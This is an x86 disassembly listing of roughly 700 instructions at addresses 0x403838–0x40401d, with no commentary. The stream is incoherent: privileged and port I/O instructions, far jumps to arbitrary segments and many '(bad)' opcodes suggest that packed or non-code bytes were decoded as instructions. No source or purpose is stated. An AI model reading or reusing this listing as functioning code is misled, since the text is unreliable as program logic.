  403838:	and    DWORD PTR [edi],esp
  40383a:	dec    eax
  40383b:	ins    DWORD PTR es:[edi],dx
  40383c:	mov    al,ds:0x1fccdf61
  403841:	sub    BYTE PTR [edi],dh
  403843:	dec    eax
  403844:	out    0x91,al
  403846:	cs ins DWORD PTR es:[edi],dx
  403848:	adc    DWORD PTR [edx+0x5655a63b],esi
  40384e:	popa   
  40384f:	and    eax,0xf4cefefe
  403854:	retf   0x330a
  403857:	inc    edx
  403858:	mov    edx,0xed9fceac
  40385d:	leave  
  40385e:	ss mov esi,0xdbd894dc
  403864:	js     0x4038d9
  403866:	xchg   edx,eax
  403867:	sbb    eax,0xbc60d67b
  40386c:	repz pop ss
  40386e:	loop   0x40387c
  403870:	fwait
  403871:	push   esp
  403872:	mov    esi,0xfe0ab38a
  403877:	iret   
  403878:	icebp  
  403879:	loope  0x4038ba
  40387b:	mov    ecx,0x28cb4c9f
  403880:	xchg   DWORD PTR [edx-0x53],ecx
  403883:	std    
  403884:	xor    eax,0xef5a503b
  403889:	push   eax
  40388a:	outs   dx,BYTE PTR ds:[esi]
  40388b:	ror    edx,cl
  40388d:	push   ds
  40388e:	pop    ebp
  40388f:	in     eax,0x20
  403891:	ss out 0x3d,al
  403894:	adc    eax,0xa587be91
  40389a:	pop    edx
  40389b:	mov    ebp,0xfb00b98b
  4038a0:	pop    eax
  4038a1:	mov    al,ds:0xc9dc947d
  4038a6:	push   edx
  4038a7:	(bad)  
  4038a8:	fucom  st(3)
  4038aa:	sbb    ecx,eax
  4038ac:	mov    eax,ds:0x5f6151eb
  4038b1:	jg     0x403866
  4038b3:	inc    edx
  4038b4:	neg    DWORD PTR [edi]
  4038b6:	(bad)  
  4038b7:	xor    eax,0xfc00fb21
  4038bc:	daa    
  4038bd:	sahf   
  4038be:	call   0x708b103c
  4038c3:	xchg   BYTE PTR [ecx+0x7a],bh
  4038c6:	not    DWORD PTR ds:0x98e37f9e
  4038cc:	sbb    BYTE PTR [edx+0x73e5f980],ch
  4038d2:	das    
  4038d3:	(bad)  
  4038d4:	call   0xf9717da3
  4038d9:	mov    al,ds:0x97d70ecd
  4038de:	sub    DWORD PTR [esi-0x39],edi
  4038e1:	pushf  
  4038e2:	or     BYTE PTR [edi+0x25],cl
  4038e5:	xor    BYTE PTR [ebx-0x6b4e8cea],ch
  4038eb:	mov    DWORD PTR [eax-0x17],ebp
  4038ee:	mov    BYTE PTR [ecx-0x38],cl
  4038f1:	and    BYTE PTR [edx-0x1ad8b761],cl
  4038f7:	in     al,0x41
  4038f9:	sub    al,0x35
  4038fb:	ret    0x58a2
  4038fe:	jnp    0x4038a6
  403900:	loopne 0x403978
  403902:	cmp    al,0xbe
  403904:	mov    ds:0xa535f36a,al
  403909:	popf   
  40390a:	mov    bl,BYTE PTR [edx+0x72]
  40390d:	jne    0x4038d7
  40390f:	dec    esi
  403910:	es pop ecx
  403912:	push   edx
  403913:	jne    0x40394b
  403915:	xor    BYTE PTR ds:0x41291551,bl
  40391b:	lds    eax,FWORD PTR [ebx-0x12]
  40391e:	lds    esi,FWORD PTR [esp+edi*2-0x6]
  403922:	dec    edx
  403923:	sub    al,0xed
  403925:	aas    
  403926:	leave  
  403927:	or     eax,0x6228c5b8
  40392c:	addr16 out 0xf7,eax
  40392f:	cmp    DWORD PTR [ebx],ebx
  403931:	leave  
  403932:	jmp    0x7b68771
  403937:	push   ebx
  403938:	fs cs jnp 0x40392f
  40393c:	xchg   esi,eax
  40393d:	test   eax,0xc3d8f3b6
  403942:	adc    DWORD PTR [edx-0x4c],esi
  403945:	cld    
  403946:	lds    ebp,FWORD PTR [esi]
  403948:	add    esi,DWORD PTR [eax]
  40394a:	loopne 0x403946
  40394c:	pop    es
  40394d:	outs   dx,BYTE PTR ds:[esi]
  40394e:	ja     0x4039aa
  403950:	je     0x4039b1
  403952:	dec    edx
  403953:	shr    BYTE PTR [eax+0x72],1
  403956:	sub    esi,edi
  403958:	mov    dl,0x47
  40395a:	dec    edx
  40395b:	ficomp DWORD PTR [esi+0x68]
  40395e:	stos   BYTE PTR es:[edi],al
  40395f:	cmp    DWORD PTR [edx],ecx
  403961:	or     DWORD PTR [edx+0x5b3e1e53],0x23
  403968:	pop    ss
  403969:	js     0x4039c6
  40396b:	mov    ah,0xf0
  40396d:	jp     0x403939
  40396f:	les    edi,FWORD PTR [ecx-0x25d7c243]
  403975:	sbb    BYTE PTR [eax-0x1c],al
  403978:	addr16 mov bl,0xf7
  40397b:	popa   
  40397c:	inc    al
  40397e:	in     eax,dx
  40397f:	lds    ebx,FWORD PTR [edi]
  403981:	inc    esi
  403982:	fnstcw WORD PTR [ebp+0x5a]
  403985:	xor    bl,BYTE PTR [ecx+eax*2]
  403988:	mov    esi,0xa39ff18
  40398d:	gs mov edi,0xe7c4333
  403993:	mov    ebx,0x40bfe986
  403998:	shl    esp,0x3d
  40399b:	or     eax,0x7d0d29fe
  4039a0:	pop    ss
  4039a1:	mov    esp,0x93b29fe
  4039a6:	jb     0x40399e
  4039a8:	mov    ah,0x2b
  4039aa:	xor    dl,BYTE PTR [eax-0x6ef092f7]
  4039b0:	enter  0x22ff,0x61
  4039b4:	xchg   ebp,eax
  4039b5:	js     0x4039cb
  4039b7:	push   ecx
  4039b8:	jmp    0xcdae:0x982068ee
  4039bf:	xchg   ecx,eax
  4039c0:	or     eax,0x37968283
  4039c5:	fcomp  QWORD PTR [esi+0x4d]
  4039c8:	ss hlt 
  4039ca:	xor    eax,0x5f6e48df
  4039cf:	nop
  4039d0:	hlt    
  4039d1:	inc    ebp
  4039d2:	pop    ecx
  4039d3:	mov    WORD PTR [esi-0x53b12556],es
  4039d9:	mov    al,ds:0x7e716012
  4039de:	std    
  4039df:	sbb    eax,0x428d9120
  4039e4:	mov    dl,0x12
  4039e6:	nop
  4039e7:	cmp    al,BYTE PTR [edi+0x72221b3a]
  4039ed:	pop    ebx
  4039ee:	dec    eax
  4039ef:	sahf   
  4039f0:	setb   BYTE PTR [esi-0x5d050199]
  4039f7:	(bad)  ds:0xbcfaef2f
  4039fd:	jno    0x4039d6
  4039ff:	lods   al,BYTE PTR ds:[esi]
  403a00:	xchg   BYTE PTR [ecx],al
  403a02:	jae    0x403a7c
  403a04:	cmp    eax,0xadc604eb
  403a09:	push   cs
  403a0a:	into   
  403a0b:	neg    BYTE PTR [ecx-0x13]
  403a0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a0f:	jb     0x4039ce
  403a11:	out    0x4e,al
  403a13:	inc    esi
  403a14:	sub    eax,DWORD PTR [eax+0x5f]
  403a17:	cmp    edi,eax
  403a19:	enter  0xe711,0xb2
  403a1d:	icebp  
  403a1e:	jae    0x4039b0
  403a20:	xchg   edi,eax
  403a21:	ret    
  403a22:	sbb    ch,BYTE PTR [eax+0x579437f]
  403a28:	jmp    0x403a1b
  403a2a:	lods   al,BYTE PTR ds:[esi]
  403a2b:	scas   eax,DWORD PTR es:[edi]
  403a2c:	cmp    esp,DWORD PTR [ebp-0x6a947567]
  403a32:	sbb    DWORD PTR [eax+0x37c432a2],eax
  403a38:	cli    
  403a39:	ins    BYTE PTR es:[edi],dx
  403a3a:	push   ecx
  403a3b:	fwait
  403a3c:	xor    eax,0x171eb161
  403a41:	sbb    eax,0xf8505f21
  403a46:	stc    
  403a47:	inc    ecx
  403a48:	jo     0x403a2e
  403a4a:	jno    0x403a47
  403a4c:	adc    esi,esp
  403a4e:	xchg   BYTE PTR [esi+0x2292288d],ah
  403a54:	mov    dl,0xa4
  403a56:	pop    edx
  403a57:	pop    ebp
  403a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a59:	adc    eax,0xde1a4912
  403a5e:	sbb    eax,0xda7d4475
  403a63:	jnp    0x403a0f
  403a65:	mov    dh,0x41
  403a67:	jns    0x403a81
  403a69:	hlt    
  403a6a:	mov    ebp,0x3c7b7640
  403a6f:	test   eax,0x801534b8
  403a74:	adc    BYTE PTR [esi],0xbf
  403a77:	jne    0x403a8d
  403a79:	fsub   DWORD PTR [eax-0x59c7ddea]
  403a7f:	shr    BYTE PTR [edx-0x1b],cl
  403a82:	mov    dl,BYTE PTR [edx-0x6196540a]
  403a88:	pop    es
  403a89:	pop    ss
  403a8a:	(bad)  
  403a8b:	fild   DWORD PTR [edx+0x63]
  403a8e:	or     ch,BYTE PTR [esi]
  403a90:	pop    ebx
  403a91:	mov    al,0xdb
  403a93:	outs   dx,BYTE PTR ds:[esi]
  403a94:	(bad)  
  403a95:	fcom   DWORD PTR [ecx-0x32dc3be2]
  403a9b:	xor    dh,BYTE PTR [eax]
  403a9d:	mov    ebp,0x11abf002
  403aa2:	in     eax,dx
  403aa3:	jmp    0xe2c:0x3ae8bffe
  403aaa:	fs clc 
  403aac:	dec    ebx
  403aad:	mov    dl,0xde
  403aaf:	enter  0x6552,0xe3
  403ab3:	add    eax,0x7c1efb1
  403ab8:	sbb    DWORD PTR [ecx],edi
  403aba:	in     al,0xd9
  403abc:	mov    DWORD PTR [edx-0x5f],ebp
  403abf:	add    DWORD PTR ds:0x1675c741,ebp
  403ac5:	xor    bl,BYTE PTR [edx]
  403ac7:	test   BYTE PTR [eax],0x5a
  403aca:	(bad)  
  403acb:	iret   
  403acc:	jnp    0x403a8b
  403ace:	aam    0x1f
  403ad0:	(bad)  
  403ad1:	xlat   BYTE PTR ds:[ebx]
  403ad2:	jg     0x403ad5
  403ad4:	test   al,0x21
  403ad6:	inc    ecx
  403ad7:	fisubr DWORD PTR [esi]
  403ad9:	js     0x403b14
  403adb:	scas   al,BYTE PTR es:[edi]
  403adc:	aam    0xd3
  403ade:	xchg   edi,eax
  403adf:	ret    
  403ae0:	and    ebp,edi
  403ae2:	(bad)  
  403ae4:	xchg   edx,eax
  403ae5:	outs   dx,DWORD PTR ds:[esi]
  403ae6:	sub    BYTE PTR [ebx+eax*4-0x13],bh
  403aea:	add    BYTE PTR [edi-0x36],0x34
  403aee:	adc    DWORD PTR [eax+0x22f2a69d],ebp
  403af4:	aad    0xc2
  403af6:	mov    dl,0xc5
  403af8:	sbb    al,0xc7
  403afa:	xchg   ebp,eax
  403afb:	xor    eax,0x49d17321
  403b00:	mov    ebx,edx
  403b02:	push   0xffffffb6
  403b04:	jns    0x403b3d
  403b06:	pushf  
  403b07:	pop    es
  403b08:	in     eax,0x93
  403b0a:	imul   esp,DWORD PTR [ecx-0x658fa120],0x7a
  403b11:	mov    ah,0xf
  403b13:	imul   BYTE PTR [ecx]
  403b15:	jmp    0x405f:0x6b1caaac
  403b1c:	sbb    dl,BYTE PTR fs:[ebx]
  403b1f:	adc    BYTE PTR [ebp+0x9],0xcd
  403b23:	nop
  403b24:	jmp    0x403b72
  403b26:	hlt    
  403b27:	xchg   esp,eax
  403b28:	std    
  403b29:	mov    DWORD PTR [ecx+0x73],ebx
  403b2c:	mov    dh,0x6
  403b2e:	mov    cl,0x6b
  403b30:	jge    0x403aee
  403b32:	or     eax,0xe85c2c97
  403b37:	aad    0x11
  403b39:	jmp    0x403b4f
  403b3b:	mov    al,ds:0xca0168ef
  403b40:	rcl    ebx,0xb6
  403b43:	inc    eax
  403b44:	(bad)  
  403b46:	sahf   
  403b47:	rol    BYTE PTR [ebx-0x56981409],0x1a
  403b4e:	sbb    DWORD PTR [ecx+0x34],0x7ddcd318
  403b55:	not    edx
  403b57:	mov    al,0xc7
  403b59:	lods   al,BYTE PTR ds:[esi]
  403b5a:	popa   
  403b5b:	stos   DWORD PTR es:[edi],eax
  403b5c:	mov    DWORD PTR [ebx-0x76],edx
  403b5f:	icebp  
  403b60:	add    DWORD PTR [eax+0x25a85d06],edi
  403b66:	out    dx,al
  403b67:	sbb    DWORD PTR [esp+edi*8+0x4a4d13b1],0xf49ed9f5
  403b72:	adc    DWORD PTR [ecx+0x600242a7],edx
  403b78:	push   0x5bb92dc1
  403b7d:	pop    esp
  403b7e:	mov    ah,0xeb
  403b80:	into   
  403b81:	pop    ds
  403b82:	mul    BYTE PTR [esi]
  403b84:	retf   
  403b85:	or     bl,BYTE PTR [edx+0x48]
  403b88:	rcr    BYTE PTR [esi],1
  403b8a:	add    eax,0xd3f79df6
  403b8f:	(bad)  
  403b90:	and    BYTE PTR [edx+0x7d9af7b9],al
  403b96:	cmp    esi,DWORD PTR [esi+eax*2+0x3f19a10a]
  403b9d:	das    
  403b9e:	dec    bl
  403ba0:	sub    BYTE PTR [ebp+0x2b351733],dl
  403ba6:	or     bh,cl
  403ba8:	ds call 0x3d0a:0xa442ef59
  403bb0:	dec    esi
  403bb1:	push   0xffffffdb
  403bb3:	imul   ebp,ecx,0xe
  403bb6:	jl     0x403b45
  403bb8:	imul   ecx,esi,0x5e19ea69
  403bbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bbf:	js     0x403c28
  403bc1:	dec    ecx
  403bc2:	bound  esi,QWORD PTR [esi]
  403bc4:	xchg   BYTE PTR [ebx-0x5c],al
  403bc7:	jno    0x403b51
  403bc9:	in     eax,dx
  403bca:	xchg   esi,eax
  403bcb:	mov    dh,0xf1
  403bcd:	icebp  
  403bce:	mov    es:0x57e56047,eax
  403bd4:	mov    eax,ds:0x1f2b9185
  403bd9:	xchg   BYTE PTR [edi],dl
  403bdb:	sahf   
  403bdc:	dec    ebp
  403bdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bde:	inc    ebx
  403bdf:	ds stc 
  403be1:	test   BYTE PTR [ebx],cl
  403be3:	ret    
  403be4:	jns    0x403c0d
  403be6:	mov    edi,0xbe3e14ae
  403beb:	clc    
  403bec:	push   eax
  403bed:	pop    esp
  403bee:	mov    esp,0x27e828ca
  403bf3:	ret    0x72c5
  403bf6:	scas   al,BYTE PTR es:[edi]
  403bf7:	push   es
  403bf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bf9:	mov    ebx,0xa5e656ef
  403bfe:	retf   
  403bff:	add    eax,0xf9e05db1
  403c04:	popa   
  403c05:	push   esi
  403c06:	fiadd  DWORD PTR [edi-0x60]
  403c09:	scas   eax,DWORD PTR es:[edi]
  403c0a:	or     esi,DWORD PTR [edx]
  403c0c:	push   esi
  403c0d:	or     DWORD PTR [edi+0x2f4502fc],ebp
  403c13:	jg     0x403c03
  403c15:	cdq    
  403c16:	fsubr  QWORD PTR [esi-0x1edaef6c]
  403c1c:	inc    esi
  403c1d:	fsubr  QWORD PTR [eax]
  403c1f:	aam    0xc0
  403c21:	mov    bl,0x7e
  403c23:	test   BYTE PTR [ebx],cl
  403c25:	xchg   DWORD PTR [edx],edx
  403c27:	mov    dl,bl
  403c29:	mov    dh,0xdc
  403c2b:	mov    esi,0x84a767b
  403c30:	mov    ds:0xd54a9c64,eax
  403c35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c36:	daa    
  403c37:	push   ebp
  403c38:	or     ch,bl
  403c3a:	mov    ah,0xf1
  403c3c:	push   DWORD PTR [ebx]
  403c3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c3f:	ret    0xfa96
  403c42:	mov    cl,0x8a
  403c44:	dec    BYTE PTR [esi+eax*4]
  403c47:	sub    al,0x24
  403c49:	je     0x403beb
  403c4b:	stos   BYTE PTR es:[edi],al
  403c4c:	sbb    al,0xb9
  403c4e:	in     al,0xdb
  403c50:	fsubr  QWORD PTR [ebp-0x6e68cd48]
  403c56:	dec    esp
  403c57:	loop   0x403c7f
  403c59:	and    ch,dl
  403c5b:	and    dl,BYTE PTR [esi+esi*2]
  403c5e:	fs ins BYTE PTR es:[edi],dx
  403c60:	jmp    0x96e0629d
  403c65:	mov    ecx,0xc2aef87f
  403c6a:	mov    bl,0x9c
  403c6c:	das    
  403c6d:	push   cs
  403c6e:	push   ecx
  403c6f:	xchg   ebx,eax
  403c70:	and    ah,cl
  403c72:	(bad)  
  403c73:	mov    ebx,0x1fa226b9
  403c78:	out    dx,eax
  403c79:	lods   eax,DWORD PTR ds:[esi]
  403c7a:	loope  0x403cc1
  403c7c:	shl    ebx,0x47
  403c7f:	mov    cl,BYTE PTR [esi+ebp*8]
  403c82:	sbb    dl,BYTE PTR [eax+0x724c0a5f]
  403c88:	mov    ds:0x1c8ead09,al
  403c8d:	sbb    ebp,0x43
  403c90:	stc    
  403c91:	ss imul esi,DWORD PTR ss:[eax],0x761ef4cd
  403c99:	sahf   
  403c9a:	test   eax,0x558cfb6c
  403c9f:	mov    BYTE PTR [edi],bh
  403ca1:	mov    edi,0xe758b4e
  403ca6:	push   0x8e3e2946
  403cab:	mov    esi,0xa340667
  403cb0:	int3   
  403cb1:	call   0xfc63:0xb4f53b78
  403cb8:	inc    esi
  403cb9:	inc    ebx
  403cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cbb:	adc    al,0xe
  403cbd:	xchg   BYTE PTR ds:0x9df1a4f0,bh
  403cc3:	rol    DWORD PTR [eax+0x6fe0a087],cl
  403cc9:	sbb    al,0xe2
  403ccb:	sbb    BYTE PTR [ebp-0x2a],0x31
  403ccf:	call   0x9d13:0xf90d4428
  403cd6:	cmp    eax,0x13912832
  403cdb:	fimul  WORD PTR [ecx-0x13]
  403cde:	pop    ebp
  403cdf:	(bad)  
  403ce0:	jns    0x403ce5
  403ce2:	inc    BYTE PTR [esi-0x3b]
  403ce5:	mov    ch,0x71
  403ce7:	adc    edi,ebx
  403ce9:	scas   al,BYTE PTR es:[edi]
  403cea:	push   esi
  403ceb:	jp     0x403d2a
  403ced:	ror    BYTE PTR [eax+0x7db2f292],cl
  403cf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cf4:	mov    eax,0x75040dc3
  403cf9:	ins    DWORD PTR es:[edi],dx
  403cfa:	sahf   
  403cfb:	xchg   esp,eax
  403cfc:	out    dx,al
  403cfd:	ror    BYTE PTR [esi+0x53],0x4a
  403d01:	sbb    ebx,DWORD PTR [ebx+0x4c]
  403d04:	ins    BYTE PTR es:[edi],dx
  403d05:	sub    BYTE PTR [esi+edx*4-0x29d7c5ec],dl
  403d0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d0d:	loope  0x403d7b
  403d0f:	jge    0x403d4e
  403d11:	mov    edi,0xf587ac50
  403d16:	lahf   
  403d17:	and    DWORD PTR [ebp+0xa2f6db],esp
  403d1d:	sahf   
  403d1e:	pusha  
  403d1f:	lahf   
  403d20:	jmp    0x45f2ea0c
  403d25:	mov    bh,0xa0
  403d27:	daa    
  403d28:	dec    ebx
  403d29:	inc    ecx
  403d2a:	aam    0x12
  403d2c:	push   ebp
  403d2d:	enter  0x73d5,0x58
  403d31:	loopne 0x403cb6
  403d33:	mov    ecx,0x67ea33c4
  403d38:	xor    bl,bh
  403d3a:	sbb    bl,BYTE PTR ds:0x29660596
  403d40:	xor    BYTE PTR [edi],0x37
  403d43:	jne    0x403ce5
  403d45:	adc    esi,eax
  403d47:	jmp    0x5c15f92e
  403d4c:	inc    eax
  403d4d:	jmp    FWORD PTR [ebp+edx*8-0x26a5ff35]
  403d54:	ret    
  403d55:	mov    ebp,0x14c28ec5
  403d5a:	(bad)  
  403d5c:	test   BYTE PTR [ecx-0x5e020c8a],dh
  403d62:	jl     0x403d63
  403d64:	data16 hlt 
  403d66:	fs sbb eax,0x70c8fc37
  403d6c:	or     al,0xd1
  403d6e:	mul    DWORD PTR [edx+0x4a]
  403d71:	mov    esp,esp
  403d73:	xcrypt-ctr (bad)
  403d74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d75:	pop    ebx
  403d76:	hlt    
  403d77:	leave  
  403d78:	pop    edx
  403d79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d7a:	test   eax,0x586d3517
  403d7f:	push   es
  403d80:	mov    ecx,ds
  403d82:	scas   al,BYTE PTR es:[edi]
  403d83:	add    BYTE PTR [ebx-0x2c33e5d2],dl
  403d89:	test   dh,bh
  403d8b:	push   ebp
  403d8c:	call   0x8f9e:0xd8cf1f6c
  403d93:	pop    esi
  403d94:	sbb    ebx,DWORD PTR ds:0xa5c9d6dc
  403d9a:	imul   eax,esp,0xd4005c3e
  403da0:	cwde   
  403da1:	sub    eax,0x259878ad
  403da6:	rcr    ebp,1
  403da8:	div    BYTE PTR cs:[edx+0x34]
  403dac:	sub    ecx,DWORD PTR [edx]
  403dae:	loopne 0x403da7
  403db0:	pushf  
  403db1:	sbb    al,0xfe
  403db3:	pop    esi
  403db4:	jecxz  0x403dac
  403db6:	inc    esp
  403db7:	xor    esp,DWORD PTR [ecx]
  403db9:	data16 or al,0xed
  403dbc:	ins    BYTE PTR es:[edi],dx
  403dbd:	xchg   esi,eax
  403dbe:	dec    esi
  403dbf:	xor    dh,BYTE PTR [ebp-0x26d25de]
  403dc5:	je     0x403ded
  403dc7:	add    ch,BYTE PTR [ecx]
  403dc9:	sahf   
  403dca:	lods   al,BYTE PTR ds:[esi]
  403dcb:	mov    bl,BYTE PTR [esi+0x40b8721b]
  403dd1:	sub    esi,DWORD PTR [ecx+eiz*8]
  403dd4:	icebp  
  403dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dd6:	test   DWORD PTR ds:0xdb3b7d2c,esp
  403ddc:	ds repnz add BYTE PTR fs:[ebx],dh
  403de1:	jp     0x403db5
  403de3:	mov    cs,WORD PTR [esi]
  403de5:	adc    eax,DWORD PTR [ebx]
  403de7:	aam    0x2e
  403de9:	(bad)  
  403dea:	out    0xd2,eax
  403dec:	xor    DWORD PTR [ebx],ebp
  403dee:	mov    WORD PTR [edx-0x13],?
  403df1:	into   
  403df2:	dec    ebx
  403df3:	(bad)  
  403df4:	ds jb  0x403ddf
  403df7:	aaa    
  403df8:	dec    edx
  403df9:	jecxz  0x403de7
  403dfb:	lock leave 
  403dfd:	cmc    
  403dfe:	arpl   bp,ax
  403e00:	mov    ds:0x47d6960d,al
  403e05:	pusha  
  403e06:	dec    edx
  403e07:	mov    al,0xd8
  403e09:	pop    ecx
  403e0a:	aad    0x2c
  403e0c:	lods   al,BYTE PTR fs:[esi]
  403e0e:	ret    
  403e0f:	or     DWORD PTR [ecx-0x3d0e328],edi
  403e15:	lods   eax,DWORD PTR ds:[esi]
  403e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e17:	mov    edx,0xa676adad
  403e1c:	retf   0xfedb
  403e1f:	mov    al,ch
  403e21:	mov    eax,0x31388b14
  403e26:	mov    al,ds:0x70eae1a1
  403e2b:	jge    0x403df3
  403e2d:	xchg   edi,eax
  403e2e:	mov    cl,0x1e
  403e30:	mov    dh,BYTE PTR ds:0x76f60738
  403e36:	and    cl,bl
  403e38:	sub    eax,0x59cf74fe
  403e3d:	dec    esi
  403e3e:	cmp    BYTE PTR [edi+0x7c],0x2c
  403e42:	lea    esi,[ebp+0x747e5085]
  403e48:	mov    edi,0x77084877
  403e4d:	jns    0x403ece
  403e4f:	imul   BYTE PTR [eax]
  403e51:	mov    dl,BYTE PTR [ebp-0x7d]
  403e54:	jmp    0x403e9f
  403e56:	pop    ds
  403e57:	jle    0x403ec9
  403e59:	inc    esp
  403e5a:	rcr    BYTE PTR [edi-0x1a],cl
  403e5d:	push   esp
  403e5e:	mov    bl,0x7c
  403e60:	xor    eax,0x2f24605a
  403e66:	sub    BYTE PTR es:[ebp+0x31],ah
  403e6a:	and    eax,DWORD PTR [ecx+0x2604342e]
  403e70:	stc    
  403e71:	out    dx,eax
  403e72:	jb     0x403e4a
  403e74:	jbe    0x403e97
  403e76:	sub    al,0xf1
  403e78:	lds    ebp,FWORD PTR ds:0xb8eff712
  403e7e:	ja     0x403e5e
  403e80:	scas   al,BYTE PTR es:[edi]
  403e81:	in     eax,0x96
  403e83:	pop    ecx
  403e84:	imul   edx,edi,0xa2cc7494
  403e8a:	loope  0x403e98
  403e8c:	sbb    BYTE PTR [eax+0x46714df7],bl
  403e92:	fdiv   DWORD PTR [ebx+0x1b]
  403e95:	mov    cl,0x59
  403e97:	xchg   DWORD PTR [ecx+0x6c872fa7],esp
  403e9d:	movd   mm0,ecx
  403ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ea1:	js     0x403ecc
  403ea3:	cmp    eax,0xbb5b92c6
  403ea8:	fsubr  QWORD PTR [ecx]
  403eaa:	dec    edi
  403eab:	shr    cl,0x6
  403eae:	xchg   edi,eax
  403eaf:	inc    edx
  403eb0:	pop    ebp
  403eb1:	add    bl,dl
  403eb3:	shr    DWORD PTR [edx-0x46],1
  403eb6:	cdq    
  403eb7:	xor    eax,DWORD PTR [edx]
  403eb9:	sub    cl,cl
  403ebb:	xor    DWORD PTR ds:0xfad0039a,ebp
  403ec1:	adc    DWORD PTR [ebx],ecx
  403ec3:	or     ch,BYTE PTR [edi]
  403ec5:	jmp    0x6ae5b162
  403eca:	imul   ebp,DWORD PTR [ebx+0x60ef93b2],0x5bdebc02
  403ed4:	sub    al,0xae
  403ed6:	add    eax,0xc5ef4941
  403edb:	xchg   ebx,eax
  403edc:	loope  0x403eec
  403ede:	daa    
  403edf:	and    al,0x45
  403ee1:	add    ecx,DWORD PTR [edi+edi*1+0x22660a56]
  403ee8:	lods   eax,DWORD PTR ds:[esi]
  403ee9:	cmp    eax,0xc27ec705
  403eee:	add    ebx,DWORD PTR [ebx-0x52]
  403ef1:	adc    BYTE PTR [edx-0x6f],0x5d
  403ef5:	mov    ds:0x7aa8f0d5,eax
  403efa:	loop   0x403e88
  403efc:	mov    ds:0x98894765,eax
  403f01:	sbb    BYTE PTR [edx+0x75734890],bl
  403f07:	ss pop ebx
  403f09:	mov    cl,0x28
  403f0b:	loop   0x403ea2
  403f0d:	cld    
  403f0e:	xor    BYTE PTR [edx-0x2e5b4eee],0x5d
  403f15:	and    al,0x41
  403f17:	xor    DWORD PTR [edx+ecx*4+0x3446b2b2],edi
  403f1e:	and    edi,ebp
  403f20:	aad    0x66
  403f22:	leave  
  403f23:	loope  0x403f11
  403f25:	pop    ebp
  403f26:	pop    ebp
  403f27:	pusha  
  403f28:	sbb    eax,edx
  403f2a:	mov    edi,ds
  403f2c:	sti    
  403f2d:	pop    ecx
  403f2e:	aas    
  403f2f:	adc    dh,BYTE PTR [edi+0x5792d689]
  403f35:	loop   0x403f1f
  403f37:	push   esi
  403f38:	fst    QWORD PTR [eax]
  403f3a:	and    al,0x34
  403f3c:	retf   
  403f3d:	xchg   esi,eax
  403f3e:	neg    DWORD PTR [edx+0x52c481a3]
  403f44:	in     eax,0xf8
  403f46:	adc    al,0x41
  403f48:	std    
  403f49:	iret   
  403f4a:	loop   0x403f79
  403f4c:	ret    
  403f4d:	xchg   edx,edi
  403f4f:	iret   
  403f50:	jge    0x403ef3
  403f52:	sub    BYTE PTR [edi+ecx*8],ah
  403f55:	push   ecx
  403f56:	push   ebx
  403f57:	inc    ebp
  403f58:	fst    DWORD PTR [ebx-0x5121edd3]
  403f5e:	pop    eax
  403f5f:	add    eax,0x6010655b
  403f64:	inc    esp
  403f65:	adc    ebp,eax
  403f67:	test   eax,0x7eb7be26
  403f6c:	wrmsr  
  403f6e:	push   esp
  403f6f:	ficomp WORD PTR [ebx]
  403f71:	xor    ebx,DWORD PTR [esi]
  403f73:	jecxz  0x403f31
  403f75:	xchg   ecx,eax
  403f76:	stos   DWORD PTR es:[di],eax
  403f78:	push   ebp
  403f79:	sbb    bh,BYTE PTR [ecx+ecx*8-0x5992a7e2]
  403f80:	enter  0xba0b,0xec
  403f84:	jno    0x403f6f
  403f86:	cmp    al,BYTE PTR [eax+0x1c]
  403f89:	ret    0x2455
  403f8c:	imul   ebp,edi,0xffffff8f
  403f8f:	iret   
  403f90:	test   eax,0xbdda2846
  403f95:	xor    DWORD PTR [esi],0xc9046139
  403f9b:	jno    0x403f3d
  403f9d:	rcpps  xmm3,xmm3
  403fa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fa1:	ret    0x3abd
  403fa4:	dec    ebx
  403fa5:	jae    0x403f2b
  403fa7:	aam    0x6
  403fa9:	add    DWORD PTR [ecx-0x6d],eax
  403fac:	push   0x4a80b1b8
  403fb1:	bound  edx,QWORD PTR [edx]
  403fb3:	sahf   
  403fb4:	pop    eax
  403fb5:	pop    esp
  403fb6:	mov    ebp,0x4ab5db2
  403fbb:	or     BYTE PTR [edx+ebp*4],0x8f
  403fbf:	pop    ebx
  403fc0:	jp     0xc36a2411
  403fc6:	dec    esi
  403fc7:	cmp    bl,BYTE PTR [ecx+0x4eb61229]
  403fcd:	push   es
  403fce:	jg     0x404025
  403fd0:	adc    ecx,DWORD PTR [esi+esi*1-0xc2d5bb4]
  403fd7:	pop    ss
  403fd8:	mov    ch,0xa5
  403fda:	or     eax,0x98e5ed93
  403fdf:	ret    
  403fe0:	imul   ecx,DWORD PTR [edx],0xd8796ac4
  403fe6:	test   BYTE PTR [esi+edi*8-0x4b004f80],0x78
  403fee:	ret    
  403fef:	ds test al,0xea
  403ff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ff3:	icebp  
  403ff4:	loope  0x403f97
  403ff6:	js     0x404055
  403ff8:	or     ebp,DWORD PTR [edi]
  403ffa:	push   esi
  403ffb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ffc:	out    0x4f,al
  403ffe:	mov    eax,0x125c934f
  404003:	ins    DWORD PTR es:[edi],dx
  404004:	and    eax,0x5a88d653
  404009:	clc    
  40400a:	dec    edi
  40400b:	cmp    al,0xa1
  40400d:	imul   eax,DWORD PTR [edx+0x211030d8],0x1984f3a7
  404017:	(bad)  
  404018:	das    
  404019:	sahf   
  40401a:	ficomp WORD PTR [esi-0x5b]
  40401d:	jg     0x404014
